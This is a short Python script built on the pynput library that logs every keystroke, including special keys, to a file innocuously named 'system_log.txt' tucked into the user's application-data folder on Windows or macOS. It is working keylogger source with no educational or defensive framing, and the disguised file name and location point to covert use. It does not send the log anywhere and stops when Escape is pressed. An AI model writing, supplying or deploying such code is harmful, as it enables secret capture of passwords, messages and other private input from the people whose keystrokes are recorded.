import os
import platform
from pynput import keyboard

def get_log_file_path():
    """Determine the path to the log file based on the operating system."""
    if platform.system() == 'Windows':
        # Store in %APPDATA% on Windows
        appdata_dir = os.getenv('APPDATA')
        log_file = os.path.join(appdata_dir, 'system_log.txt')
    else:
        # Store in ~/Library/Application Support on macOS
        app_support_dir = os.path.expanduser('~/Library/Application Support')
        log_file = os.path.join(app_support_dir, 'system_log.txt')
    return log_file

# Get the path to the log file
log_file = get_log_file_path()

# Ensure the directory for the log file exists
os.makedirs(os.path.dirname(log_file), exist_ok=True)

def on_press(key):
    """Callback function to handle key press events."""
    try:
        # Attempt to write the character of the key pressed to the log file
        with open(log_file, 'a') as f:
            f.write(f'{key.char}')
    except AttributeError:
        # Handle special keys (e.g., space, enter, etc.) by writing their name
        with open(log_file, 'a') as f:
            f.write(f'[{key}]')

def on_release(key):
    """Callback function to handle key release events."""
    if key == keyboard.Key.esc:
        # Stop the listener if the Escape key is released
        return False

# Start listening to keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    # Join the listener to the main thread to keep it running
    listener.join()